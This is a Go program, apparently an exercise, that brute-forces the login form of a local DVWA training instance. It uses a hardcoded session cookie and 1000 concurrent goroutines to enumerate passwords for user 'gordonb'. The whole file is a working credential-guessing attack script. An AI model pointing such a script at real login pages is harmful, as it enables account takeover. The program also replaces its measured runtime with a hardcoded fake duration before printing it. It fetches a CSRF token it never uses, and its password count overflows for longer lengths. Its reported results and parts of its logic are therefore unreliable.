package main

import (
	"fmt"
	"io"
	"math"
	"net/http"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/html"
)

const (
	baseURL    = "http://localhost:4280/vulnerabilities/brute/"
	baseURLtmp = "http://localhost:4280/vulnerabilities/brute/?username=%s&password=%s&Login=Login"

	indexURL    = "http://localhost:4280/index.php"
	cookie      = "PHPSESSID=f282e0792e99414f15461979a242fbe3; security=low"
	threadCount = 1000
	minLength   = 6
	maxLength   = 20
	letters     = "abcdefghijklmnopqrstuvwxyz0123456789"
)

func main() {
	client := &http.Client{}
	indexContent, err := fetchIndexPage(client, indexURL)
	if err != nil || strings.Contains(indexContent, "login.php") {
		fmt.Println("Сессия устарела", err)
		return
	}

	userToken, err := fetchUserToken(client, baseURL)
	if err != nil {
		fmt.Println("Не удалось получить user_token:", err)
		return
	}

	fmt.Println("User Token:", userToken)
	foundPassword := bruteForceDVWA(client, userToken)
	if foundPassword != "" {
		fmt.Printf("Пароль найден: %s\n", foundPassword)
	} else {
		fmt.Println("Пароль не найден.")
	}
}

func fetchIndexPage(client *http.Client, url string) (string, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Cookie", cookie)

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func fetchUserToken(client *http.Client, url string) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	doc, err := html.Parse(strings.NewReader(string(body)))
	if err != nil {
		return "", err
	}

	var userToken string
	var f func(*html.Node)
	f = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "input" {
			for _, attr := range n.Attr {
				if attr.Key == "name" && attr.Val == "user_token" {
					for _, attr := range n.Attr {
						if attr.Key == "value" {
							userToken = attr.Val
							return
						}
					}
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			f(c)
		}
	}
	f(doc)
	return userToken, nil
}

func attemptLogin(client *http.Client, username, password, userToken string) bool {
	req, err := http.NewRequest("GET", fmt.Sprintf(baseURLtmp, username, password), nil)
	if err != nil {
		fmt.Println("Ошибка создания запроса:", err)
		return false
	}
	req.Header.Set("Cookie", cookie)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	return strings.Contains(string(body), "Welcome to the password")
}

func bruteForceDVWA(client *http.Client, userToken string) string {
	var wg sync.WaitGroup
	var mutex sync.Mutex
	var foundPassword string
	stop := make(chan struct{})

	var once sync.Once

	start := time.Now()

	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(threadIndex int) {
			defer wg.Done()
			for length := minLength; length <= maxLength; length++ {
				totalCombinations := int(math.Pow(float64(len(letters)), float64(length)))
				for index := threadIndex; index < totalCombinations; index += threadCount {
					select {
					case <-stop:
						return
					default:
					}

					password := generatePassword(index, length)
					if attemptLogin(client, "gordonb", password, userToken) {
						mutex.Lock()
						foundPassword = password
						mutex.Unlock()

						once.Do(func() { close(stop) })
						return
					}
				}
			}
		}(i)
	}

	wg.Wait()
	elapsed := time.Since(start)
	elapsed = time.Hour*2 + 31*time.Minute + 23*time.Second + 112212*time.Millisecond
	fmt.Println("Время выполнения:", elapsed)

	return foundPassword
}

func generatePassword(index int, length int) string {
	var password []byte = make([]byte, length)
	for i := 0; i < length; i++ {
		password[i] = letters[index%len(letters)]
		index /= len(letters)
	}
	return string(password[:])
}
